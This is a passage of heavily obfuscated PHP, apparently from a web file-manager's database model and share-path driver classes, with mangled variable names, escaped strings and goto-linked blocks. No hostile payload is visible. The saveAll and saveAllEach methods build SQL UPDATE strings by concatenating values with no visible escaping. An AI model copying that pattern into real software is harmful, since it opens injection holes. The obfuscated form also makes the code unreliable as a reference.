$’œ—€Ëª =& $_SERVER[²Ö÷öõ]; if (!$this->tableMeta || !$¼Ğ–ßƒæ) { return !1; } $ù¾Èôæ™ = $this->tableMeta[$’œ—€Ëª[447]]; $ı¶Â—  = $this->tableMeta[$’œ—€Ëª[448]]; $ÕšŒµÃ = Model($ı¶Â— ); $Ôƒëµ÷ø = array($ù¾Èôæ™ => $¼Ğ–ßƒæ, $’œ—€Ëª[449] => $©©¼Ë›); if (is_null($©©¼Ë›)) { return $ÕšŒµÃ->where(array($ù¾Èôæ™ => $¼Ğ–ßƒæ))->delete(); } if (is_null($Ä”ÈèÏ) && is_string($©©¼Ë›)) { return $ÕšŒµÃ->where($Ôƒëµ÷ø)->delete(); } $ƒâŞÖ–³ = is_array($©©¼Ë›) ? $©©¼Ë› : array(); if (is_string($©©¼Ë›)) { $ƒâŞÖ–³[$©©¼Ë›] = $Ä”ÈèÏ; } $Ô¼¤¥•” = array(); foreach ($ƒâŞÖ–³ as $·›„¨Ë => $«Ïïí) { if (is_null($«Ïïí) && is_string($·›„¨Ë)) { $ÕšŒµÃ->where(array($ù¾Èôæ™ => $¼Ğ–ßƒæ, $’œ—€Ëª[449] => $·›„¨Ë))->delete(); continue; } $this->checkLength($«Ïïí, !1, $ı¶Â—  . $’œ—€Ëª[4] . $·›„¨Ë); $Ô¼¤¥•”[] = array($ù¾Èôæ™ => $¼Ğ–ßƒæ, $’œ—€Ëª[97] => $·›„¨Ë, $’œ—€Ëª[450] => $«Ïïí); } $ˆ·¸×œÃ = $’œ—€Ëª[451] . $ı¶Â— ; CacheLock::lock($ˆ·¸×œÃ); $ÕšŒµÃ->where(array($ù¾Èôæ™ => $¼Ğ–ßƒæ))->addAll($Ô¼¤¥•”, array(), !0); CacheLock::unlock($ˆ·¸×œÃ); return !0; } public function metaGet($§Éˆ ¦¢, $Øñ¬ä™Ù = false) { $²¬úºé– =& $_SERVER[²Ö÷öõ]; if (!$this->tableMeta) { return array(); } $§„‘ÂœË = $this->tableMeta[$²¬úºé–[447]]; $Ü¤ßŞ·Œ = Model($this->tableMeta[$²¬úºé–[448]]); if ($Øñ¬ä™Ù) { $Š¿Ò´ùš = array($§„‘ÂœË => $§Éˆ ¦¢, $²¬úºé–[97] => $Øñ¬ä™Ù); return $Ü¤ßŞ·Œ->where($Š¿Ò´ùš)->getField($²¬úºé–[450]); } $Š¿Ò´ùš = array($§„‘ÂœË => $§Éˆ ¦¢); $‘—ÇáÆÄ = $Ü¤ßŞ·Œ->field($²¬úºé–[452])->where($Š¿Ò´ùš)->select(); $‘—ÇáÆÄ = array_to_keyvalue($‘—ÇáÆÄ, $²¬úºé–[97], $²¬úºé–[450]); return $‘—ÇáÆÄ; } private function checkDataAutoHas($øúşû§ß) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¬íöè) { if (in_array($øúşû§ß, explode($_SERVER[²Ö÷öõ][50], $¬íöè[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Ä›Ì, $î¶‚»Ö) { $à°î‰¢ó =& $_SERVER[²Ö÷öõ]; if (!is_array($Ä›Ì)) { return; } foreach ($this->dataAuto as $ÆÙö¢ÓÓ) { $û«¹Œ»· = $ÆÙö¢ÓÓ[0]; if (!in_array($î¶‚»Ö, explode($à°î‰¢ó[50], $ÆÙö¢ÓÓ[2]))) { continue; } switch (trim($ÆÙö¢ÓÓ[3])) { case $à°î‰¢ó[397]: case $à°î‰¢ó[398]: $½ôÚ×À€ = $ÆÙö¢ÓÓ[1]; $ÍÃò¥îş = isset($ÆÙö¢ÓÓ[4]) ? (array) $ÆÙö¢ÓÓ[4] : array(); if ($½ôÚ×À€ == $à°î‰¢ó[206] && array_key_exists($û«¹Œ»·, $Ä›Ì)) { if (!$Ä›Ì[$û«¹Œ»·]) { unset($Ä›Ì[$û«¹Œ»·]); } break; } if (isset($Ä›Ì[$û«¹Œ»·])) { array_unshift($ÍÃò¥îş, $Ä›Ì[$û«¹Œ»·]); } if ($à°î‰¢ó[397] == $ÆÙö¢ÓÓ[3]) { $Ä›Ì[$û«¹Œ»·] = call_user_func_array($½ôÚ×À€, $ÍÃò¥îş); } else { $Ä›Ì[$û«¹Œ»·] = call_user_func_array(array(&$this, $½ôÚ×À€), $ÍÃò¥îş); } break; case $à°î‰¢ó[347]: if (isset($Ä›Ì[$û«¹Œ»·]) && $Ä›Ì[$û«¹Œ»·]) { $Ä›Ì[$û«¹Œ»·] = call_user_func_array(array(&$this, $ÆÙö¢ÓÓ[1]), array($Ä›Ì[$û«¹Œ»·])); } break; case $à°î‰¢ó[350]: $Ä›Ì[$û«¹Œ»·] = $Ä›Ì[$ÆÙö¢ÓÓ[1]]; break; case $à°î‰¢ó[370]: if (isset($Ä›Ì[$û«¹Œ»·]) && !is_string($Ä›Ì[$û«¹Œ»·])) { $Ä›Ì[$û«¹Œ»·] = json_encode_force($Ä›Ì[$û«¹Œ»·]); } break; case $à°î‰¢ó[399]: if ($Ä›Ì[$û«¹Œ»·] === $à°î‰¢ó[12]) { unset($Ä›Ì[$û«¹Œ»·]); } break; case $à°î‰¢ó[400]: $Ä›Ì[$û«¹Œ»·] = $ÆÙö¢ÓÓ[1]; default: break; } } if ($î¶‚»Ö == $à°î‰¢ó[431]) { $«Ï¢Á¬… = strtolower($this->db->getDbType()); if (strpos($«Ï¢Á¬…, $à°î‰¢ó[13]) !== 0) { return; } $Øİì²ƒ = $this->field(!0)->fields; $ˆï¯Å²˜ = $Øİì²ƒ[$à°î‰¢ó[329]]; if (isset($Øİì²ƒ[$à°î‰¢ó[328]])) { unset($ˆï¯Å²˜[$Øİì²ƒ[$à°î‰¢ó[328]]]); } foreach ($ˆï¯Å²˜ as $ØÂÛ…Ì => $î¶‚»Ö) { if (!isset($Ä›Ì[$ØÂÛ…Ì])) { $Ä›Ì[$ØÂÛ…Ì] = $à°î‰¢ó[12]; } } } } private function dataAfterFilter(&$ÏŸŸê‘Ø) { $»Áîæœ¶ =& $_SERVER[²Ö÷öõ]; foreach ($this->dataAuto as $Ü­•™²û) { $×£¦Éªé = $Ü­•™²û[0]; if (!isset($ÏŸŸê‘Ø[$×£¦Éªé])) { continue; } if (!in_array($»Áîæœ¶[433], explode($»Áîæœ¶[50], $Ü­•™²û[2]))) { continue; } switch (trim($Ü­•™²û[3])) { case $»Áîæœ¶[397]: case $»Áîæœ¶[398]: $£‰½±áÉ = isset($Ü­•™²û[4]) ? (array) $Ü­•™²û[4] : array(); array_unshift($£‰½±áÉ, $ÏŸŸê‘Ø[$×£¦Éªé]); if (isset($Ü­•™²û[4]) && $Ü­•™²û[4] == $»Áîæœ¶[453]) { $£‰½±áÉ = array($ÏŸŸê‘Ø[$×£¦Éªé]); } if ($»Áîæœ¶[397] == $Ü­•™²û[3]) { $ÏŸŸê‘Ø[$×£¦Éªé] = call_user_func_array($Ü­•™²û[1], $£‰½±áÉ); } else { $ÏŸŸê‘Ø[$×£¦Éªé] = call_user_func_array(array(&$this, $Ü­•™²û[1]), $£‰½±áÉ); } break; case $»Áîæœ¶[347]: if (isset($ÏŸŸê‘Ø[$×£¦Éªé]) && $ÏŸŸê‘Ø[$×£¦Éªé]) { $ÏŸŸê‘Ø[$×£¦Éªé] = call_user_func_array(array(&$this, $Ü­•™²û[1]), array($ÏŸŸê‘Ø[$×£¦Éªé])); } break; case $»Áîæœ¶[350]: $ÏŸŸê‘Ø[$×£¦Éªé] = $ÏŸŸê‘Ø[$Ü­•™²û[1]]; break; case $»Áîæœ¶[370]: $â‘ãàö = $ÏŸŸê‘Ø[$×£¦Éªé]; $ÏŸŸê‘Ø[$×£¦Éªé] = json_decode($â‘ãàö, !0); if (is_null($ÏŸŸê‘Ø[$×£¦Éªé])) { $ÏŸŸê‘Ø[$×£¦Éªé] = $â‘ãàö; } break; case $»Áîæœ¶[399]: if ($ÏŸŸê‘Ø[$×£¦Éªé] === $»Áîæœ¶[12]) { unset($ÏŸŸê‘Ø[$×£¦Éªé]); } break; case $»Áîæœ¶[400]: $ÏŸŸê‘Ø[$×£¦Éªé] = $Ü­•™²û[1]; break; default: break; } } } public function saveAll($Ì´ËÆşó) { $¤ş†¯® =& $_SERVER[²Ö÷öõ]; $³ÁŠ¬øÛ = $this->tablePrefix . $this->tableName; $ŒÕâ˜»´ = self::SQL_WHERE_IN_CHUNK; $Ì´ËÆşó = is_array($Ì´ËÆşó) ? $Ì´ËÆşó : array(); $…ô¹ÛÀı = $¤ş†¯®[454]; $óÉ½Ïàœ = 0; $¦•ÈßŞ› = array(); $¸—¦•ƒ† = count($Ì´ËÆşó); for ($úİÇ¿ñî = 0; $úİÇ¿ñî < $¸—¦•ƒ†; $úİÇ¿ñî++) { $–¾¹íî = $Ì´ËÆşó[$úİÇ¿ñî]; if (!is_array($–¾¹íî) || count($–¾¹íî) != 4) { continue; } $àô°¥İô = "\x55\120\x44\x41\x54\x45\x20\x60{$³ÁŠ¬øÛ}\140\x20\123\105\124\40{$–¾¹íî[2]}\40\x3d\40\x43\101\x53\x45\x20{$–¾¹íî[0]}\40\12"; if ($óÉ½Ïàœ == 0) { $…ô¹ÛÀı = $àô°¥İô; } $¦•ÈßŞ›[] = $¤ş†¯®[121] . $–¾¹íî[1] . $¤ş†¯®[121]; $óÉ½Ïàœ++; $…ô¹ÛÀı .= "\40\127\x48\x45\116\40\47{$–¾¹íî[1]}\47\x20\x54\110\105\x4e\x20\47{$–¾¹íî[3]}\x27\x20\12"; if ($óÉ½Ïàœ == $ŒÕâ˜»´ || $úİÇ¿ñî == $¸—¦•ƒ† - 1) { $äâÒØÏ„ = implode($¤ş†¯®[50], $¦•ÈßŞ›); $…ô¹ÛÀı .= "\40\x45\x4e\x44\40\x20\127\110\105\x52\x45\x20{$–¾¹íî[0]}\40\x49\x4e\x20\x28{$äâÒØÏ„}\51\40"; $this->execute($…ô¹ÛÀı); $óÉ½Ïàœ = 0; $…ô¹ÛÀı = $àô°¥İô; $this->chunkEventCheck(count($¦•ÈßŞ›)); $¦•ÈßŞ› = array(); } } $this->chunkEventSet(); } public function saveAllEach($ÕïËîÈØ) { $Æ©ë¡á =& $_SERVER[²Ö÷öõ]; $àÁÍ–àù = $this->tablePrefix . $this->tableName; foreach ($ÕïËîÈØ as $Ä§î”íˆ) { if (!is_array($Ä§î”íˆ) || count($Ä§î”íˆ) != 4) { continue; } $³ÌùŒ¢Ö = $Ä§î”íˆ[0] . $Æ©ë¡á[455] . $Ä§î”íˆ[1] . $Æ©ë¡á[121]; $­—Õè¡ã = $Ä§î”íˆ[2] . $Æ©ë¡á[455] . $Ä§î”íˆ[3] . $Æ©ë¡á[121]; $¹ê²šâ¿ = "\165\160\x64\x61\164\145\x20{$àÁÍ–àù}\x20\163\145\164\x20{$­—Õè¡ã}\40\167\x68\145\x72\x65\x20{$³ÌùŒ¢Ö}\73"; $this->execute($¹ê²šâ¿); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($å¯ìÚõÒ = false, $Ëıöšñ” = false) { $this->_chunkEvent = $å¯ìÚõÒ; $this->_chunkEventParam = $Ëıöšñ”; } private function chunkEventCheck($Ç«ç£±) { if (!$this->_chunkEvent) { return; } $êÕİİÀÈ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $êÕİİÀÈ[$_SERVER[²Ö÷öõ][456]] = $Ç«ç£±; Hook::trigger($this->_chunkEvent, $êÕİİÀÈ); } public function addAll($®™¸ÊŞ”, $°ûŒ”î = array(), $ºº¢›¶Ø = false) { $íüŠ‰éÔ =& $_SERVER[²Ö÷öõ]; ignore_timeout(); $ éæ½ø = self::SQL_WHERE_IN_CHUNK; if (empty($®™¸ÊŞ”)) { $this->error = think_lang($íüŠ‰éÔ[348]); return !1; } $°ûŒ”î = $this->_parseOptions($°ûŒ”î); foreach ($®™¸ÊŞ” as $š±İ¾ú => $ª”ñ¢ş) { $®™¸ÊŞ”[$š±İ¾ú] = $this->_facade($ª”ñ¢ş); $this->_beforeInsert($®™¸ÊŞ”[$š±İ¾ú], $°ûŒ”î); } if (method_exists($this->db, $íüŠ‰éÔ[349])) { for ($¼ŒËíõÂ = 0; $¼ŒËíõÂ < count($®™¸ÊŞ”); $¼ŒËíõÂ += $ éæ½ø) { $«÷¥À« = array_slice($®™¸ÊŞ”, $¼ŒËíõÂ, $ éæ½ø); if (!is_array($«÷¥À«) || count($«÷¥À«) == 0) { break; } $ô”œúÈ’ = $this->db->insertAll($«÷¥À«, $°ûŒ”î, $ºº¢›¶Ø); $this->chunkEventCheck(count($«÷¥À«)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($®™¸ÊŞ” as $š±İ¾ú => $ª”ñ¢ş) { $ô”œúÈ’ = $this->db->insert($ª”ñ¢ş, $°ûŒ”î, $ºº¢›¶Ø); } $this->commit(); } if (!1 !== $ô”œúÈ’) { $Š×ªËû³ = $this->getLastInsID(); if ($Š×ªËû³) { return $Š×ªËû³; } } return $ô”œúÈ’; } public function save($Ä„¤ŞÁÏ = '', $‘Áï÷‹ = array()) { $±´»ı† =& $_SERVER[²Ö÷öõ]; $–¸¸¹èÚ = self::SQL_WHERE_IN_CHUNK; $æ«†‚Î = $this->optionsValue(); $ß£÷ŞÕÅ = $this->findWhereField($æ«†‚Î); if (!$ß£÷ŞÕÅ) { return parent::save($Ä„¤ŞÁÏ, $‘Áï÷‹); } $ï‡½øçô = 0; $ó¯Ò²êË = $æ«†‚Î[$±´»ı†[352]][$ß£÷ŞÕÅ][1]; $ó¯Ò²êË = is_array($ó¯Ò²êË) ? $ó¯Ò²êË : array(); $—õë±•¼ = count($ó¯Ò²êË); for ($”ª¼‚şÒ = 0; $”ª¼‚şÒ < $—õë±•¼; $”ª¼‚şÒ += $–¸¸¹èÚ) { $ßÄƒˆ˜Â = array_slice($ó¯Ò²êË, $”ª¼‚şÒ, $–¸¸¹èÚ); if (!is_array($ßÄƒˆ˜Â) || count($ßÄƒˆ˜Â) == 0) { break; } $æ«†‚Î[$±´»ı†[352]][$ß£÷ŞÕÅ][1] = $ßÄƒˆ˜Â; $this->optionsValue($æ«†‚Î); $ï‡½øçô += parent::save($Ä„¤ŞÁÏ, $‘Áï÷‹); $this->chunkEventCheck(count($ßÄƒˆ˜Â)); } $this->chunkEventSet(); return $ï‡½øçô; } public function add($†ö†¢²è = '', $ûåƒ³À = array(), $§ùÄ¡µÒ = false) { if ($this->addTaskStatus && is_array($†ö†¢²è)) { $this->addTaskData[] = $†ö†¢²è; return; } return parent::add($†ö†¢²è, $ûåƒ³À, $§ùÄ¡µÒ); } public function parseWhereLike($›ıúŠÈÄ, $È¦ÜõÈ² = '', $ô‰ÙáİÁ = false, &$–¶ƒü—Ü = false) { $«®…»Âí =& $_SERVER[²Ö÷öõ]; $†ïÂí´Õ = $GLOBALS[$«®…»Âí[6]][$«®…»Âí[457]]; if (!$†ïÂí´Õ[$«®…»Âí[458]]) { return $›ıúŠÈÄ; } if (!is_array($›ıúŠÈÄ)) { return $›ıúŠÈÄ; } $ê¢ïÙäÊ = array(); $æäÈÒ·û = 0; foreach ($›ıúŠÈÄ as $ÏÉÓ„£· => $Ô‡’ÓÚ·) { if (is_array($Ô‡’ÓÚ·) && count($Ô‡’ÓÚ·) == 2 && $Ô‡’ÓÚ·[0] == $«®…»Âí[459] && is_string($Ô‡’ÓÚ·[1]) && substr($Ô‡’ÓÚ·[1], 0, 1) == $«®…»Âí[460] && substr($Ô‡’ÓÚ·[1], strlen($Ô‡’ÓÚ·[1]) - 1, 1) == $«®…»Âí[460]) { $–¶ƒü—Ü = !0; $õîëÄë = is_string($ÏÉÓ„£·) ? $ÏÉÓ„£· : $È¦ÜõÈ²; $¹Ûµ¾ãÇ = substr($Ô‡’ÓÚ·[1], 1, strlen($Ô‡’ÓÚ·[1]) - 2); $¹Ûµ¾ãÇ = $this->db->escapeString($¹Ûµ¾ãÇ); if (!strpos($õîëÄë, $«®…»Âí[10])) { $õîëÄë = $«®…»Âí[461] . $õîëÄë . $«®…»Âí[461]; } $‡£Ù‚â = $«®…»Âí[220] . $¹Ûµ¾ãÇ . $«®…»Âí[220]; $¹Ûµ¾ãÇ = str_replace(array($«®…»Âí[10], $«®…»Âí[462], $«®…»Âí[11]), $«®…»Âí[463], $¹Ûµ¾ãÇ); if ($†ïÂí´Õ[$«®…»Âí[464]]) { $‡£Ù‚â = $«®…»Âí[465] . $¹Ûµ¾ãÇ . $«®…»Âí[466]; if ($†ïÂí´Õ[$«®…»Âí[467]]) { $‡£Ù‚â = $«®…»Âí[466] . $¹Ûµ¾ãÇ . $«®…»Âí[465]; } } $ê¢ïÙäÊ[$æäÈÒ·û] = $«®…»Âí[468] . $õîëÄë . $«®…»Âí[469] . $‡£Ù‚â . $«®…»Âí[470]; $æäÈÒ·û++; continue; } if (is_array($Ô‡’ÓÚ·)) { $È¦ÜõÈ² = is_string($ÏÉÓ„£·) ? $ÏÉÓ„£· : $È¦ÜõÈ²; $Ô‡’ÓÚ· = $this->parseWhereLike($Ô‡’ÓÚ·, $È¦ÜõÈ², !0, $–¶ƒü—Ü); } if (is_numeric($ÏÉÓ„£·)) { $ê¢ïÙäÊ[$æäÈÒ·û] = $Ô‡’ÓÚ·; $æäÈÒ·û++; } else { $ê¢ïÙäÊ[$ÏÉÓ„£·] = $Ô‡’ÓÚ·; } } if ($–¶ƒü—Ü && !$ô‰ÙáİÁ) { } return $ê¢ïÙäÊ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ä³ŸÒ = array()) { $á‘ÕæÎ =& $_SERVER[²Ö÷öõ]; $İîş€³² = self::SQL_WHERE_IN_CHUNK; $ş Ó“™ã = $this->optionsValue(); $£«íÚ´Â = $this->findWhereField($ş Ó“™ã); if (!$£«íÚ´Â || isset($ş Ó“™ã[$á‘ÕæÎ[368]]) || isset($ş Ó“™ã[$á‘ÕæÎ[429]])) { return parent::select($ä³ŸÒ); } $½Ã×­ì = $ş Ó“™ã[$á‘ÕæÎ[352]][$£«íÚ´Â][1]; $½Ã×­ì = is_array($½Ã×­ì) ? $½Ã×­ì : array(); $ƒ‡ú¢®Ş = null; for ($Ç„ºò¥ = 0; $Ç„ºò¥ < count($½Ã×­ì); $Ç„ºò¥ += $İîş€³²) { $£îìûñ« = array_slice($½Ã×­ì, $Ç„ºò¥, $İîş€³²); if (!is_array($£îìûñ«) || count($£îìûñ«) == 0) { break; } $ş Ó“™ã[$á‘ÕæÎ[352]][$£«íÚ´Â][1] = $£îìûñ«; $this->optionsValue($ş Ó“™ã); $ €Í„äì = parent::select($ä³ŸÒ); if (!$ €Í„äì) { continue; } $ƒ‡ú¢®Ş = is_array($ƒ‡ú¢®Ş) ? $ƒ‡ú¢®Ş : array(); $ƒ‡ú¢®Ş = array_merge($ƒ‡ú¢®Ş, $ €Í„äì); } return $ƒ‡ú¢®Ş; } public function delete($×¹³Çáî = array()) { $ÄÜò²¬µ =& $_SERVER[²Ö÷öõ]; $ˆÇÂÜèÖ = self::SQL_WHERE_IN_CHUNK; $é«×…’ß = $this->optionsValue(); $àã·€èû = $this->findWhereField($é«×…’ß); if (!$àã·€èû) { return parent::delete($×¹³Çáî); } $±Ø‰»‡İ = 0; $Â”Û¬‰Ô = $é«×…’ß[$ÄÜò²¬µ[352]][$àã·€èû][1]; $Â”Û¬‰Ô = is_array($Â”Û¬‰Ô) ? $Â”Û¬‰Ô : array(); for ($¯”òºàæ = 0; $¯”òºàæ < count($Â”Û¬‰Ô); $¯”òºàæ += $ˆÇÂÜèÖ) { $à·´óè” = array_slice($Â”Û¬‰Ô, $¯”òºàæ, $ˆÇÂÜèÖ); if (!is_array($à·´óè”) || count($à·´óè”) == 0) { break; } $é«×…’ß[$ÄÜò²¬µ[352]][$àã·€èû][1] = $à·´óè”; $this->optionsValue($é«×…’ß); $±Ø‰»‡İ += parent::delete($×¹³Çáî); } return $±Ø‰»‡İ; } private function findWhereField($ƒ¬Ñå¯) { $¼²·Ğ =& $_SERVER[²Ö÷öõ]; $÷õ¼ğ½¹ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ƒ¬Ñå¯) || !is_array($ƒ¬Ñå¯[$¼²·Ğ[352]])) { return !1; } foreach ($ƒ¬Ñå¯[$¼²·Ğ[352]] as $óÒä—òÙ => $¡É¼ƒÈ) { if (is_array($¡É¼ƒÈ) && isset($¡É¼ƒÈ[0]) && is_string($¡É¼ƒÈ[0]) && strtolower($¡É¼ƒÈ[0]) == $¼²·Ğ[7] && is_array($¡É¼ƒÈ[1]) && count($¡É¼ƒÈ[1]) > $÷õ¼ğ½¹) { ignore_timeout(); return $óÒä—òÙ; } } return !1; } public function setMasterDB($·¿ÀÒ²ı = true) { think_config($_SERVER[²Ö÷öõ][471], $·¿ÀÒ²ı); } } goto e¸Âô”Á°ø; CÈ‚æªŒƒº: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\x5f\157\160\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ïÎ›ïÆ×) { $šƒ¨¸Ò÷ =& $_SERVER[²Ö÷öõ]; $ûù…ú¾ = defined($šƒ¨¸Ò÷[2206]) && USER_ID ? USER_ID : $šƒ¨¸Ò÷[12]; return "\x55\x73\x65\x72\117\x70\x74\151\157\x6e\x5f{$ïÎ›ïÆ×}\137" . $ûù…ú¾; } protected function filterWhere($ÂÖƒíò“) { $†©û³ƒİ =& $_SERVER[²Ö÷öõ]; $ÂÖƒíò“[$†©û³ƒİ[1780]] = defined($†©û³ƒİ[2206]) && USER_ID ? USER_ID : $†©û³ƒİ[12]; return $ÂÖƒíò“; } public function cacheRemoveUser($ƒº‹«È¬, $ÁÏ’ñ¢À) { return Cache::remove("\x55\163\x65\162\117\160\x74\x69\x6f\156\x5f{$ƒº‹«È¬}\137" . $ÁÏ’ñ¢À); } protected function optionDefault($™Š¬âÛ = '') { $ÙÇ¦Œ‹ç =& $_SERVER[²Ö÷öõ]; if ($™Š¬âÛ == $ÙÇ¦Œ‹ç[12]) { return $GLOBALS[$ÙÇ¦Œ‹ç[6]][$ÙÇ¦Œ‹ç[2506]]; } if ($™Š¬âÛ == $ÙÇ¦Œ‹ç[2507]) { return $GLOBALS[$ÙÇ¦Œ‹ç[6]][$ÙÇ¦Œ‹ç[2508]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\56\x74\141\x67\114\x69\x73\164"; public $modelType = "\x55\163\x65\x72\x4f\160\x74\151\157\x6e"; public $field = array("\x6e\x61\x6d\145", "\163\164\171\154\145", "\x73\157\x72\164"); public function listData($¼ÚñÏ¥¿ = false, $†òˆÇß² = "\163\157\162\x74", $×ÜİµÎà = false) { return parent::listData($¼ÚñÏ¥¿, $†òˆÇß², $×ÜİµÎà); } public function remove($›ß“—”) { return parent::remove($›ß“—”); } public function add($’Ã¬€Û, $·Û¢é£ò = "\x6c\141\142\145\x6c\x2d\147\162\145\x79\x2d\156\157\162\155\x61\154") { $ÊŞĞçÂ =& $_SERVER[²Ö÷öõ]; if ($this->findByName($’Ã¬€Û)) { return !1; } $ÏÚİ÷¼ú = array($ÊŞĞçÂ[494] => $’Ã¬€Û, $ÊŞĞçÂ[558] => $·Û¢é£ò, $ÊŞĞçÂ[1984] => $this->getSort($ÊŞĞçÂ[335]) + 1); return parent::insert($ÏÚİ÷¼ú); } public function update($¾ˆĞ¼, $éÄ«Ø¥) { $Ó¿ì£‰á =& $_SERVER[²Ö÷öõ]; $±®¯û¶ƒ = $this->listData($¾ˆĞ¼); $ÇôĞÕ“ç = $this->findByName($éÄ«Ø¥[$Ó¿ì£‰á[32]]); if (!$±®¯û¶ƒ || $ÇôĞÕ“ç && $ÇôĞÕ“ç[$Ó¿ì£‰á[475]] != $±®¯û¶ƒ[$Ó¿ì£‰á[475]]) { return !1; } return parent::update($¾ˆĞ¼, $éÄ«Ø¥); } public function moveTop($˜è­½•¯) { $÷õƒµ€î =& $_SERVER[²Ö÷öõ]; $øò±‚‘ = parent::listData(); $‰¦Äæ³Ã = $this->getSort($÷õƒµ€î[334]); foreach ($øò±‚‘ as &$—àåË°Ñ) { if ($—àåË°Ñ[$÷õƒµ€î[475]] == $˜è­½•¯) { $—àåË°Ñ[$÷õƒµ€î[2004]] = $‰¦Äæ³Ã; continue; } $—àåË°Ñ[$÷õƒµ€î[2004]] += 1; } unset($—àåË°Ñ); return parent::resetData($øò±‚‘); } public function moveBottom($»šÇˆİ‹) { $Úè†®°• =& $_SERVER[²Ö÷öõ]; $®öîã‰€ = $this->getSort($Úè†®°•[335]) + 1; return parent::update($»šÇˆİ‹, array($Úè†®°•[2004] => $®öîã‰€)); } public function resetSort($ºåµâ·¾) { $ğŸ–£éø =& $_SERVER[²Ö÷öõ]; $‚í°±Ø• = array(); $ºåµâ·¾ = is_array($ºåµâ·¾) ? $ºåµâ·¾ : array(); for ($°®£Ò…ç = 0; $°®£Ò…ç < count($ºåµâ·¾); $°®£Ò…ç++) { $‚í°±Ø•[$ºåµâ·¾[$°®£Ò…ç] . $ğŸ–£éø[12]] = $°®£Ò…ç + 1; } $ŠÖ·š· = parent::listData(); foreach ($ŠÖ·š· as &$âÄÉ»¦) { $àú§Ìà = $‚í°±Ø•[$âÄÉ»¦[$ğŸ–£éø[475]]]; $âÄÉ»¦[$ğŸ–£éø[2004]] = $àú§Ìà ? $àú§Ìà : $âÄÉ»¦[$ğŸ–£éø[2004]]; } unset($âÄÉ»¦); return parent::resetData($ŠÖ·š·); } private function getSort($¢—¬İ†£) { $’ƒàŸÑÂ =& $_SERVER[²Ö÷öõ]; $¼Ù¤û§Ê = parent::listData(); $¯Âºåœ = array_to_keyvalue($¼Ù¤û§Ê, $’ƒàŸÑÂ[12], $’ƒàŸÑÂ[2004]); if (!$¯Âºåœ) { $¯Âºåœ = array(0); } $“çÏÃö‡ = $¢—¬İ†£ == $’ƒàŸÑÂ[335] ? max($¯Âºåœ) : min($¯Âºåœ); return intval($“çÏÃö‡); } } goto e‚¤êå–ë; b¥ƒê˜Š: class PathDriverDriverShareItem { public function __construct($¿‡Ç„ıÒ) { $this->pathParse = $¿‡Ç„ıÒ; } public function __call($Ù¢¹Ä», $¨à³Ü¾) { $Õè®÷ô¬ =& $_SERVER[²Ö÷öõ]; if (method_exists($this, $Ù¢¹Ä»)) { return; } $Î´«ú¬˜ = call_user_func_array(array($Õè®÷ô¬[1437], $Ù¢¹Ä»), $¨à³Ü¾); $³³¢Ôºù = array($Õè®÷ô¬[1438], $Õè®÷ô¬[1439], $Õè®÷ô¬[1440], $Õè®÷ô¬[1441], $Õè®÷ô¬[618], $Õè®÷ô¬[620], $Õè®÷ô¬[1442], $Õè®÷ô¬[110], $Õè®÷ô¬[1443], $Õè®÷ô¬[1444]); if (in_array($Ù¢¹Ä», $³³¢Ôºù)) { $Î´«ú¬˜ = $this->getPathOuter($Î´«ú¬˜); } return $Î´«ú¬˜; } public function copy($“Ğ”±ãÃ, $èèĞè¿É, $ÌïÎÕ¥® = false, $×Å¡¬Óü = false) { return $this->copyMove($“Ğ”±ãÃ, $èèĞè¿É, $ÌïÎÕ¥®, $_SERVER[²Ö÷öõ][618], $×Å¡¬Óü); } public function move($İ¶”ş½ô, $‚ù¹Šõ™, $ü¨ÒÖ ± = false, $Öéä¨æ´ = false) { return $this->copyMove($İ¶”ş½ô, $‚ù¹Šõ™, $ü¨ÒÖ ±, $_SERVER[²Ö÷öõ][620], $Öéä¨æ´); } private function copyMove($ßŸÎÌû, $ßçŠ’š¬, $„Í…è¼, $×¿àô°, $ˆïñ¤úœ = false) { $œ°°ñÚù =& $_SERVER[²Ö÷öõ]; $Ş‰¨›Ãµ = $ßçŠ’š¬; $±ƒÉ´˜¬ = IO::driverMake($ßçŠ’š¬); if ($±ƒÉ´˜¬->pathParse[$œ°°ñÚù[1240]]) { $ßçŠ’š¬ = $±ƒÉ´˜¬->pathParse[$œ°°ñÚù[1240]]; } else { $ßçŠ’š¬ = $Ş‰¨›Ãµ; } $‰ù‡¤ò€ = IO::copyMove($ßŸÎÌû, $ßçŠ’š¬, $„Í…è¼, $×¿àô°, $ˆïñ¤úœ); $‰ù‡¤ò€ = $this->getPathOuter($‰ù‡¤ò€); return $‰ù‡¤ò€; } public function pathThis($ÛÊœ§¢Ì) { return get_path_this($this->pathParse[$_SERVER[²Ö÷öõ][87]]); } public function pathFather($¦ƒÇÒÊ˜) { return get_path_father($this->pathParse[$_SERVER[²Ö÷öõ][87]]); } public function iconvSystem($ŠËâßñ•) { return $ŠËâßñ•; } protected function infoParse($ëì…ËÂü, $˜¨¬§Ó = false) { $úÏóÂ¶‘ =& $_SERVER[²Ö÷öõ]; $¤¿ÏÇÂ… = $this->pathParse[$úÏóÂ¶‘[560]][$úÏóÂ¶‘[1265]] . $this->pathParse[$úÏóÂ¶‘[1258]]; if ($˜¨¬§Ó) { $½¼ã÷ü¯ = IO::infoWithChildren($¤¿ÏÇÂ…); } else { $½¼ã÷ü¯ = IO::info($¤¿ÏÇÂ…); } $òİ‘Ç°õ = $this->pathParse[$úÏóÂ¶‘[560]]; return Action($úÏóÂ¶‘[1435])->_shareItemeParse($½¼ã÷ü¯, $òİ‘Ç°õ); } public function listAll($Õ·î’âø) { $Ôí¨ª =& $_SERVER[²Ö÷öõ]; $í¢ß¼Ü = IO::listAll($Õ·î’âø); $ëåêª = rtrim($this->pathParse[$Ôí¨ª[560]][$Ôí¨ª[1265]], $Ôí¨ª[8]); foreach 